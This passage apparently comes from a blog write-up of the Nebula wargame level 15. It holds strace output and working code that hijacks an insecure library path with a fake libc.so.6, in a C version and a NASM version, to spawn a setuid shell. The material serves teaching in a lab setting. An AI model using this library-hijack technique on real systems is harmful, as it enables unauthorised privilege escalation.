stat64(&ldquo;/var/tmp/flag15/tls/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/i686/sse2/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/i686/sse2/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/i686/sse2&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/i686/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/i686/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/i686/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/i686&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/sse2/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/sse2/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/sse2/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/sse2&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15&rdquo;, 0xbf8a8bb4)   = -1 ENOENT (No such file or directory)
open(&ldquo;/etc/ld.so.cache&rdquo;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, &hellip;}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7843000
close(3)                                = 0
access(&ldquo;/etc/ld.so.nohwcap&rdquo;, F_OK)      = -1 ENOENT (No such file or directory)
open(&ldquo;/lib/i386-linux-gnu/libc.so.6&rdquo;, O_RDONLY) = 3
read(3, &ldquo;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&rdquo;&hellip;, 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, &hellip;}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000
mmap2(0x286000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x286000
mmap2(0x289000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x289000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7842000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb78428d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x286000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x46b000, 4096, PROT_READ)     = 0
munmap(0xb7843000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784b000
write(1, &ldquo;strace it!\n&rdquo;, 11strace it!
)            = 11
exit_group(11)                          = ?
{% endcodeblock %}</p>

<p>We try to provide this library (in <code>/var/tmp/flag15/libc.so.6</code>):
{% codeblock lang:console %}
level15@nebula:/tmp$ cat libc.so.6.c
void f(void *a) {}</p>

<p>level15@nebula:/tmp$ mkdir /var/tmp/flag15</p>

<p>level15@nebula:/tmp$ gcc -shared libc.so.6.c -o /var/tmp/flag15/libc.so.6</p>

<p>level15@nebula:/tmp$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
{% endcodeblock %}</p>

<p>There is an error, because we are linking using GLIBC_2.1.3, but in the binary, there are two symbols with GLIBC_2.0 undefined:
{% codeblock %}
level15@nebula:/tmp$ nm /home/flag15/flag15  | grep &ldquo;.*U&rdquo;
         U __libc_start_main@@GLIBC_2.0
         U puts@@GLIBC_2.0
{% endcodeblock %}</p>

<p>We provide version script to the linker, link statically and try the same thing again.
{% codeblock lang:console version.map %}
GLIBC_2.0   {};
{% endcodeblock %}</p>

<p>{% codeblock lang:c libc.so.6.c %}</p>

<h1>include &lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {
  setreuid(geteuid(),geteuid());
  execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);</p>

<p>  return 0;
}
{% endcodeblock %}</p>

<p>{% codeblock %}
level15@nebula:/tmp$ gcc -shared -static-libgcc -Wl,&ndash;version-script=version.map,-Bstatic libc.so.6.c -o /var/tmp/flag15/libc.so.6</p>

<p>level15@nebula:/tmp$ /home/flag15/flag15
flag15@nebula:/tmp$ getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<p>The second way how to solve the challenge is without linking libc, writing assembler code. For this purpose we used <a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/">nasm</a>
assembler, everything needed for the compilation process was already on the nebula iso.</p>

<p>{% codeblock %}
level15@nebula:/tmp$ wget -q <a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/nasm-2.11.08.tar.gz">http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/nasm-2.11.08.tar.gz</a>
level15@nebula:/tmp$ tar xzf nasm-2.11.08.tar.gz
level15@nebula:/tmp$ cd nasm-2.11.08/
level15@nebula:/tmp/nasm-2.11.08$ ./configure &amp;&amp; make ; cd ..
{% endcodeblock %}</p>

<p>{% codeblock lang:asm shell.asm %}
section .data
cmd db &lsquo;/bin/sh&rsquo;,0x0</p>

<p>section .text</p>

<p>global shell</p>

<p>shell:</p>

<p>;setreuid(geteuid(),geteuid());
mov eax, 49
int 0x80
mov ebx, eax
mov ecx, eax
mov eax, 70
int 0x80</p>

<p>;execve(&ldquo;/bin/sh&rdquo;, {&ldquo;/bin/sh&rdquo;, NULL}, NULL)
mov eax, 11
lea ebx, [cmd]
mov ecx, 0
push ecx
push ebx
mov ecx, esp
mov edx, 0
int 0x80
{% endcodeblock %}</p>

<p>{% codeblock lang:c run-shell.c %}
void shell(void);
void <strong>attribute</strong>((constructor)) init()
{
  shell();
}
{% endcodeblock %}</p>

<p>{% codeblock lang:console %}
level15@nebula:/tmp$ /tmp/nasm-2.11.08/nasm -f elf shell.asm</p>

<p>level15@nebula:/tmp$ gcc -shared -nostdlib run-shell.c shell.o -o /var/tmp/flag15/libc.so.6</p>

<p>level15@nebula:/tmp$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</p>

<p>sh-4.2$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)</p>

<p>sh-4.2$ getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
